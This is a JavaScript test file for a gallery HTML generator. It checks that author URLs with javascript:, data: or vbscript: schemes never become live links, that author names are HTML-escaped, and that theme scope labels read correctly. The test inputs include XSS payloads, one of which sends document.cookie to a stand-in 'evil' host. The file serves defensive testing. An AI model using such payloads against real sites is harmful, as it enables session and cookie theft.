/**
 * Escaping / XSS-contract tests for the gallery HTML generator. The gallery is
 * published on GitHub Pages from untrusted submission metadata, so author_url
 * must never become a live `javascript:`/`data:` href. Run: node --test
 */
import test from "node:test";
import assert from "node:assert/strict";
import { attributionHtml, scopeLabel } from "./gallery-html.mjs";

test("attributionHtml drops dangerous-scheme author_url (no live href)", () => {
  const dangerous = [
    "javascript:alert(1)",
    "JAVASCRIPT:fetch('https://evil/?c='+document.cookie)",
    "  javascript:alert(1)",
    "data:text/html,<script>alert(1)</script>",
    "vbscript:msgbox(1)",
    "not a url",
  ];
  for (const bad of dangerous) {
    const html = attributionHtml({ author: "Mallory", authorUrl: bad });
    assert.ok(!/href=/.test(html), `must not emit an href for "${bad}": ${html}`);
    assert.ok(!/javascript:|data:|vbscript:/i.test(html), `dangerous scheme leaked for "${bad}": ${html}`);
    assert.ok(html.includes("Mallory"), "author still rendered as plain text");
  }
});

test("attributionHtml keeps http(s) author_url as a safe link", () => {
  const html = attributionHtml({ author: "Ada", authorUrl: "https://example.com/ada" });
  assert.match(html, /href="https:\/\/example\.com\/ada"/);
  assert.match(html, /rel="noopener noreferrer nofollow"/);
  assert.match(html, /target="_blank"/);
});

test("attributionHtml escapes the author name + source", () => {
  const html = attributionHtml({ author: "<img src=x onerror=alert(1)>", source: "community" });
  assert.ok(!/<img/.test(html), `unescaped markup leaked: ${html}`);
  assert.ok(html.includes("&lt;img"), "author markup escaped");
});

// ---------------------------------------------------------------------------
// scopeLabel — a theme that grades its floors is not a partial theme
// ---------------------------------------------------------------------------

test("scopeLabel distinguishes a texture pack from a full theme with floors", () => {
  // A pack: floors are the whole story, so name them.
  assert.equal(scopeLabel(["tile", "wood"], true), "tile, wood");
  // A full theme that also grades its floors: says full, and still credits the
  // floor work. Printing the bare type list here read as "this theme only covers
  // those floors", which was wrong about the first theme to ship floor tokens.
  assert.equal(scopeLabel(["marble", "wood"], false), "full · floors: marble, wood");
  // No floor work at all.
  assert.equal(scopeLabel([], false), "full");
  assert.equal(scopeLabel([], true), "full");
  assert.equal(scopeLabel(undefined, false), "full");
});
